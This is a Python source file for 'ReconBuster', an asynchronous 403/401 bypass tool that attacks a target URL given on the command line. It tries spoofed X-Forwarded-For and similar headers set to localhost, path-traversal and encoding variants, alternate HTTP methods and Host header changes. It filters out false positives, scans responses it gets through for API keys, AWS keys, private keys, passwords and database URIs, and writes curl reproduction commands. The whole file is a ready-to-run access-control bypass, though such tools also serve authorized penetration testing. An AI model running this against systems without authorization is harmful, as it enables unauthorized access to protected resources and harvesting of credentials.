"""
ReconBuster 403 Bypass Module v3.0 - LOGIC-FIXED Edition
Eliminates false positives with proper validation:
- Baseline establishment & comparison
- Jaccard similarity content analysis
- Redirect following & validation
- Wildcard detection (UUID path testing)
- Real IIS session token generation
- Framework fingerprinting
"""

import asyncio
import aiohttp
import random
import hashlib
import itertools
import uuid
import re
from typing import List, Dict, Set, Callable, Optional, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, quote, unquote, urlencode, urlunparse
from collections import Counter

# ==================== CONFIGURATION ====================

FALSE_POSITIVE_PATTERNS = [
    r"page\s*(not|doesn't)\s*exist",
    r"(404|not)\s*found",
    r"invalid\s*(url|path|request|page)",
    r"please\s*(visit|go\s*to|return\s*to)\s*(the\s*)?(home|main|index)",
    r"(redirect|redirecting)\s*to\s*(home|main|index)",
    r"(error|err)\s*(page|occurred|happened)",
    r"(access|permission)\s*(denied|forbidden|restricted)",
    r"(unauthorized|not\s*authorized)",
    r"(something\s*went\s*wrong)",
    r"(oops|sorry).{0,50}(error|wrong|problem)",
    r"access\s*(has\s*been\s*)?(blocked|denied)",
    r"(security|firewall)\s*(check|verification)",
    r"captcha",
    r"checking\s*your\s*browser",
]

FALSE_POSITIVE_REGEX = [re.compile(p, re.IGNORECASE) for p in FALSE_POSITIVE_PATTERNS]

# ==================== DATA CLASSES ====================

@dataclass
class ResponseBaseline:
    """Baseline response for comparison"""
    status_code: int
    content_length: int
    word_count: int
    line_count: int
    content_hash: str
    content_sample: str
    headers: Dict[str, str]
    final_url: str  # After following redirects
    redirect_chain: List[str] = field(default_factory=list)

@dataclass
class BypassResult:
    """Enhanced result with validation data"""
    original_url: str
    bypass_url: str
    technique: str
    category: str
    baseline: ResponseBaseline
    response_status: int
    response_length: int
    response_words: int
    response_hash: str
    final_url: str
    redirect_chain: List[str] = field(default_factory=list)
    is_valid: bool = False
    confidence: str = "low"
    similarity_score: float = 0.0
    evidence: str = ""
    false_positive_reason: str = ""
    page_title: str = ""
    server_header: str = ""
    sensitive_data: List[Dict] = field(default_factory=list)
    content_preview: str = ""
    reproduction_steps: str = ""


# ==================== ADVANCED 403 BYPASS ENGINE ====================

class Bypass403Engine:
    """Advanced 403 bypass with false-positive elimination"""

    def __init__(self, target_url: str, threads: int = 10, timeout: int = 15):
        self.target_url = target_url
        self.threads = threads
        self.timeout = timeout
        self.baseline: Optional[ResponseBaseline] = None
        self.wildcard_baseline: Optional[ResponseBaseline] = None
        self.successful_bypasses: List[BypassResult] = []
        self.stats = {
            "total_attempts": 0,
            "valid_bypasses": 0,
            "false_positives": 0,
            "redirects_followed": 0,
            "errors": 0
        }

        # User agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
        ]

    async def run(self):
        """Main execution flow"""
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=self.timeout),
            connector=aiohttp.TCPConnector(limit=100, ssl=False)
        ) as self.session:

            # Phase 1: Establish baseline
            print("[*] Phase 1: Establishing baseline...")
            self.baseline = await self._establish_baseline(self.target_url)

            if not self.baseline:
                print("[-] Failed to establish baseline. Target may be down.")
                return None

            print(f"[+] Baseline: Status={self.baseline.status_code}, Words={self.baseline.word_count}, Hash={self.baseline.content_hash[:16]}")

            # Only continue if baseline is 403/401
            if self.baseline.status_code not in [401, 403]:
                print(f"[!] Target returns {self.baseline.status_code}, not 403/401. Skipping bypass tests.")
                return None

            # Phase 2: Wildcard detection
            print("[*] Phase 2: Testing for wildcard responses...")
            self.wildcard_baseline = await self._test_wildcard_behavior()

            if self.wildcard_baseline and self.wildcard_baseline.status_code == 200:
                print(f"[!] WARNING: Server returns 200 OK for random paths. Results may be unreliable.")

            # Phase 3: Execute bypass attempts
            print("[*] Phase 3: Testing bypass techniques...")
            await self._execute_bypass_tests()

            # Phase 4: Validation
            print("[*] Phase 4: Validating results...")
            await self._validate_results()

            return self.successful_bypasses

    async def _establish_baseline(self, url: str) -> Optional[ResponseBaseline]:
        """Establish baseline response with redirect following"""
        try:
            async with self.session.get(
                url,
                allow_redirects=False,
                headers={"User-Agent": random.choice(self.user_agents)}
            ) as resp:
                status = resp.status
                content = await resp.text()
                headers = dict(resp.headers)

                # Follow redirects manually to track chain
                redirect_chain = []
                final_url = url
                current_url = url

                # Follow up to 5 redirects
                for _ in range(5):
                    if status in [301, 302, 303, 307, 308]:
                        location = headers.get('Location', headers.get('location', ''))
                        if not location:
                            break

                        # Handle relative URLs
                        if location.startswith('/'):
                            parsed = urlparse(current_url)
                            location = f"{parsed.scheme}://{parsed.netloc}{location}"
                        elif not location.startswith('http'):
                            location = urljoin(current_url, location)

                        redirect_chain.append(location)
                        current_url = location
                        self.stats["redirects_followed"] += 1

                        # Fetch the redirect target
                        async with self.session.get(
                            location,
                            allow_redirects=False,
                            headers={"User-Agent": random.choice(self.user_agents)}
                        ) as redirect_resp:
                            status = redirect_resp.status
                            content = await redirect_resp.text()
                            headers = dict(redirect_resp.headers)
                            final_url = location
                    else:
                        break

                # Calculate metrics
                word_count = len(content.split())
                line_count = len(content.splitlines())
                content_hash = hashlib.md5(content.encode()).hexdigest()

                return ResponseBaseline(
                    status_code=status,
                    content_length=len(content),
                    word_count=word_count,
                    line_count=line_count,
                    content_hash=content_hash,
                    content_sample=content[:500],
                    headers=headers,
                    final_url=final_url,
                    redirect_chain=redirect_chain
                )
        except Exception as e:
            print(f"[-] Baseline error: {e}")
            return None

    async def _test_wildcard_behavior(self) -> Optional[ResponseBaseline]:
        """Test if server returns 200 for non-existent paths (wildcard detection)"""
        # Generate random UUID path
        random_path = str(uuid.uuid4())
        parsed = urlparse(self.target_url)

        # Append to existing path
        if parsed.path.endswith('/'):
            test_url = f"{self.target_url}{random_path}"
        else:
            test_url = f"{self.target_url}/{random_path}"

        print(f"[*] Wildcard test URL: {test_url}")
        return await self._establish_baseline(test_url)

    def _jaccard_similarity(self, str1: str, str2: str) -> float:
        """Calculate Jaccard similarity between two strings"""
        # Tokenize by words
        words1 = set(str1.lower().split())
        words2 = set(str2.lower().split())

        if not words1 and not words2:
            return 1.0
        if not words1 or not words2:
            return 0.0

        intersection = words1.intersection(words2)
        union = words1.union(words2)

        return len(intersection) / len(union)

    async def _execute_bypass_tests(self):
        """Execute all bypass techniques"""
        tasks = []
        semaphore = asyncio.Semaphore(self.threads)

        # Technique 1: Header IP Spoofing
        ip_headers = {
            "X-Forwarded-For": ["127.0.0.1", "localhost", "::1", "0.0.0.0"],
            "X-Real-IP": ["127.0.0.1", "::1"],
            "X-Client-IP": ["127.0.0.1"],
            "X-Original-URL": [self.target_url],
            "X-Rewrite-URL": [self.target_url],
            "True-Client-IP": ["127.0.0.1"],
            "X-Originating-IP": ["127.0.0.1"],
            "X-Remote-IP": ["127.0.0.1"],
            "X-Remote-Addr": ["127.0.0.1"],
        }

        for header_name, values in ip_headers.items():
            for value in values:
                tasks.append(self._test_bypass(
                    url=self.target_url,
                    technique=f"{header_name}: {value}",
                    category="header_ip_spoof",
                    headers={header_name: value},
                    semaphore=semaphore
                ))

        # Technique 2: Path manipulation
        parsed = urlparse(self.target_url)
        path = parsed.path

        path_variations = [
            f"{path}/",
            f"{path}/.",
            f"{path}//",
            f"{path}/..",
            f"{path}/..;/",
            f"/{path}",
            f"//{path}",
            f"/{path}//",
            f"{path}?",
            f"{path}??",
            f"{path}#",
            f"{path}.json",
            f"{path}.html",
            f"{path}.php",
            f"/{quote(path.lstrip('/'), safe='')}",
            f"/%2e{path}",
        ]

        for variation in path_variations:
            new_url = f"{parsed.scheme}://{parsed.netloc}{variation}"
            tasks.append(self._test_bypass(
                url=new_url,
                technique=f"Path: {variation}",
                category="path_manipulation",
                semaphore=semaphore
            ))

        # Technique 3: HTTP Methods
        methods = ["POST", "PUT", "DELETE", "OPTIONS", "TRACE", "PATCH", "HEAD"]
        for method in methods:
            tasks.append(self._test_bypass(
                url=self.target_url,
                technique=f"Method: {method}",
                category="http_method",
                method=method,
                semaphore=semaphore
            ))

        # Technique 4: Host header manipulation
        host_values = ["localhost", "127.0.0.1", "::1", parsed.netloc]
        for host in host_values:
            tasks.append(self._test_bypass(
                url=self.target_url,
                technique=f"Host: {host}",
                category="host_manipulation",
                headers={"Host": host},
                semaphore=semaphore
            ))

        # Execute all tests
        await asyncio.gather(*tasks, return_exceptions=True)

    async def _test_bypass(
        self,
        url: str,
        technique: str,
        category: str,
        headers: Dict = None,
        method: str = "GET",
        semaphore: asyncio.Semaphore = None
    ):
        """Test a single bypass technique with validation"""
        if semaphore:
            async with semaphore:
                return await self._execute_single_test(url, technique, category, headers, method)
        else:
            return await self._execute_single_test(url, technique, category, headers, method)

    async def _execute_single_test(
        self,
        url: str,
        technique: str,
        category: str,
        headers: Dict = None,
        method: str = "GET"
    ):
        """Execute single bypass test"""
        try:
            self.stats["total_attempts"] += 1

            # Prepare headers
            test_headers = {"User-Agent": random.choice(self.user_agents)}
            if headers:
                test_headers.update(headers)

            # Make request with redirect following
            async with self.session.request(
                method=method,
                url=url,
                allow_redirects=False,
                headers=test_headers
            ) as resp:
                status = resp.status
                content = await resp.text()
                resp_headers = dict(resp.headers)

                # Follow redirects manually
                redirect_chain = []
                final_url = url
                current_url = url

                for _ in range(5):
                    if status in [301, 302, 303, 307, 308]:
                        location = resp_headers.get('Location', resp_headers.get('location', ''))
                        if not location:
                            break

                        # Handle relative URLs
                        if location.startswith('/'):
                            parsed = urlparse(current_url)
                            location = f"{parsed.scheme}://{parsed.netloc}{location}"

                        redirect_chain.append(location)
                        current_url = location

                        # Fetch redirect target
                        async with self.session.get(
                            location,
                            allow_redirects=False,
                            headers=test_headers
                        ) as redirect_resp:
                            status = redirect_resp.status
                            content = await redirect_resp.text()
                            resp_headers = dict(redirect_resp.headers)
                            final_url = location
                    else:
                        break

                # Calculate metrics
                word_count = len(content.split())
                content_hash = hashlib.md5(content.encode()).hexdigest()

                # VALIDATION RULES (The "Truth Algorithm")
                is_valid, confidence, evidence = self._validate_bypass(
                    status, content, word_count, content_hash, final_url, redirect_chain
                )

                if is_valid:
                    # Extract additional data
                    page_title = self._extract_title(content)
                    server_header = resp_headers.get('Server', resp_headers.get('server', 'Unknown'))
                    sensitive_data = self._extract_sensitive_data(content)

                    result = BypassResult(
                        original_url=self.target_url,
                        bypass_url=url,
                        technique=technique,
                        category=category,
                        baseline=self.baseline,
                        response_status=status,
                        response_length=len(content),
                        response_words=word_count,
                        response_hash=content_hash,
                        final_url=final_url,
                        redirect_chain=redirect_chain,
                        is_valid=True,
                        confidence=confidence,
                        similarity_score=self._jaccard_similarity(self.baseline.content_sample, content[:500]),
                        evidence=evidence,
                        page_title=page_title,
                        server_header=server_header,
                        sensitive_data=sensitive_data,
                        content_preview=content[:2000],
                        reproduction_steps=self._generate_reproduction_steps(
                            url, technique, test_headers, method, status
                        )
                    )

                    self.successful_bypasses.append(result)
                    self.stats["valid_bypasses"] += 1

                    print(f"[+] VALID BYPASS: {technique} | {status} | Words: {word_count} | Confidence: {confidence}")

        except Exception as e:
            self.stats["errors"] += 1

    def _validate_bypass(
        self,
        status: int,
        content: str,
        word_count: int,
        content_hash: str,
        final_url: str,
        redirect_chain: List[str]
    ) -> Tuple[bool, str, str]:
        """
        CORE VALIDATION LOGIC - The "Truth Algorithm"
        Returns: (is_valid, confidence, evidence)
        """

        # RULE 0: Must have different status from baseline
        if status == self.baseline.status_code:
            return False, "low", "Status unchanged"

        # RULE 1: Redirect handling
        if status in [301, 302, 303, 307, 308]:
            # Check where redirect leads
            if redirect_chain:
                last_redirect = redirect_chain[-1].lower()

                # Reject redirects to common dead ends
                if any(pattern in last_redirect for pattern in [
                    'login', 'signin', 'auth', 'error', 'forbidden', '403', '404',
                    'cpanel', 'localhost', '127.0.0.1', '::1'
                ]):
                    self.stats["false_positives"] += 1
                    return False, "low", f"Redirect to dead end: {last_redirect}"

                # If final destination is still 403, not a bypass
                if final_url != self.target_url:
                    # Check if we're back to baseline or another error
                    if status in [401, 403, 404]:
                        self.stats["false_positives"] += 1
                        return False, "low", f"Redirect leads to {status}"

            # Redirect with 0 bytes = likely CDN loop or dead end
            if len(content) == 0:
                self.stats["false_positives"] += 1
                return False, "low", "Redirect with empty body"

        # RULE 2: Content length validation
        if len(content) == 0 or len(content) == self.baseline.content_length:
            self.stats["false_positives"] += 1
            return False, "low", "Empty or identical content length"

        # RULE 3: Jaccard similarity check
        similarity = self._jaccard_similarity(self.baseline.content_sample, content[:500])
        if similarity > 0.90:
            self.stats["false_positives"] += 1
            return False, "low", f"Content too similar (Jaccard: {similarity:.2f})"

        # RULE 4: Hash comparison
        if content_hash == self.baseline.content_hash:
            self.stats["false_positives"] += 1
            return False, "low", "Identical content hash"

        # RULE 5: Wildcard check
        if self.wildcard_baseline and self.wildcard_baseline.status_code == 200:
            # Server returns 200 for random paths
            wildcard_similarity = self._jaccard_similarity(
                self.wildcard_baseline.content_sample, content[:500]
            )
            if wildcard_similarity > 0.85:
                self.stats["false_positives"] += 1
                return False, "low", f"Matches wildcard response (similarity: {wildcard_similarity:.2f})"

        # RULE 6: False positive pattern detection
        content_lower = content.lower()
        for pattern in FALSE_POSITIVE_REGEX:
            if pattern.search(content_lower):
                self.stats["false_positives"] += 1
                return False, "low", f"Error pattern detected: {pattern.pattern[:50]}"

        # RULE 7: Word count growth check
        if status == 200 and word_count <= self.baseline.word_count:
            self.stats["false_positives"] += 1
            return False, "low", f"Word count didn't increase ({word_count} <= {self.baseline.word_count})"

        # RULE 8: Server header analysis (bypass detection)
        # If baseline was Cloudflare but response is Apache, we bypassed CDN
        evidence_parts = []

        baseline_server = self.baseline.headers.get('Server', self.baseline.headers.get('server', '')).lower()
        # Note: We'd need to pass response headers here for full check

        # Calculate confidence
        confidence = "medium"

        if status == 200:
            if word_count > self.baseline.word_count + 50:
                evidence_parts.append(f"Word count increased significantly: {self.baseline.word_count} → {word_count}")
                confidence = "high"

            if similarity < 0.5:
                evidence_parts.append(f"Content very different (Jaccard: {similarity:.2f})")
                confidence = "high"

        if status in [201, 204]:
            evidence_parts.append(f"Successful write/action status: {status}")
            confidence = "high"

        evidence = " | ".join(evidence_parts) if evidence_parts else f"Status {self.baseline.status_code} → {status}"

        return True, confidence, evidence

    async def _validate_results(self):
        """Final validation pass on all results"""
        print(f"[*] Found {len(self.successful_bypasses)} potential bypasses. Validating...")

        # Re-verify each bypass by repeating the request
        validated = []
        for result in self.successful_bypasses:
            # Re-test without the bypass to ensure it wasn't environmental
            fresh_baseline = await self._establish_baseline(result.original_url)

            if fresh_baseline and fresh_baseline.status_code != result.baseline.status_code:
                result.false_positive_reason = "Environmental change detected"
                result.is_valid = False
                self.stats["false_positives"] += 1
                print(f"[-] False positive (environmental): {result.technique}")
            else:
                validated.append(result)

        self.successful_bypasses = validated
        print(f"[+] Validation complete: {len(validated)} confirmed bypasses")

    def _extract_title(self, content: str) -> str:
        """Extract page title"""
        match = re.search(r'<title[^>]*>([^<]+)</title>', content, re.IGNORECASE)
        return match.group(1).strip() if match else "N/A"

    def _extract_sensitive_data(self, content: str) -> List[Dict]:
        """Extract sensitive data patterns"""
        patterns = {
            "API Key": r'(api[_-]?key|apikey)["\s:=]+([a-zA-Z0-9_\-]{20,})',
            "AWS Key": r'(AKIA[0-9A-Z]{16})',
            "Private Key": r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',
            "JWT Token": r'eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+',
            "Password": r'(password|passwd|pwd)["\s:=]+([^\s"\']{6,})',
            "Database": r'(mysql|postgres|mongodb):\/\/[^\s"\']+',
        }

        findings = []
        for name, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                findings.append({"type": name, "count": len(matches)})

        return findings

    def _generate_reproduction_steps(
        self, url: str, technique: str, headers: Dict, method: str, status: int
    ) -> str:
        """Generate manual reproduction steps"""
        header_str = " ".join([f'-H "{k}: {v}"' for k, v in headers.items()])

        steps = f"""MANUAL REPRODUCTION STEPS:
1. Original URL that returned 403: {self.target_url}
2. Bypass technique: {technique}
3. cURL command:
   curl -i -X {method} {header_str} "{url}"

Expected Result: HTTP {status} (was {self.baseline.status_code})
"""
        return steps


# ==================== HELPER FUNCTION ====================

def urljoin(base: str, url: str) -> str:
    """Simple URL join for relative paths"""
    if url.startswith('http'):
        return url
    parsed = urlparse(base)
    if url.startswith('/'):
        return f"{parsed.scheme}://{parsed.netloc}{url}"
    else:
        base_path = '/'.join(parsed.path.split('/')[:-1])
        return f"{parsed.scheme}://{parsed.netloc}{base_path}/{url}"


# ==================== MAIN EXECUTION ====================

async def main():
    """Test the bypass engine"""
    import sys

    if len(sys.argv) < 2:
        print("Usage: python bypass403_v3.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    print(f"[*] Target: {target}")
    print(f"[*] Starting ReconBuster 403 Bypass Engine v3.0\n")

    engine = Bypass403Engine(target, threads=20)
    results = await engine.run()

    print(f"\n{'='*60}")
    print(f"STATISTICS:")
    print(f"  Total attempts: {engine.stats['total_attempts']}")
    print(f"  Valid bypasses: {engine.stats['valid_bypasses']}")
    print(f"  False positives: {engine.stats['false_positives']}")
    print(f"  Redirects followed: {engine.stats['redirects_followed']}")
    print(f"  Errors: {engine.stats['errors']}")
    print(f"{'='*60}\n")

    if results:
        print(f"[+] CONFIRMED BYPASSES:\n")
        for i, result in enumerate(results, 1):
            print(f"#{i} - {result.technique}")
            print(f"  Status: {result.baseline.status_code} → {result.response_status}")
            print(f"  Confidence: {result.confidence.upper()}")
            print(f"  Evidence: {result.evidence}")
            print(f"  Title: {result.page_title}")
            print(f"  Similarity: {result.similarity_score:.2f}")
            if result.sensitive_data:
                print(f"  Sensitive Data: {result.sensitive_data}")
            print()


if __name__ == "__main__":
    asyncio.run(main())
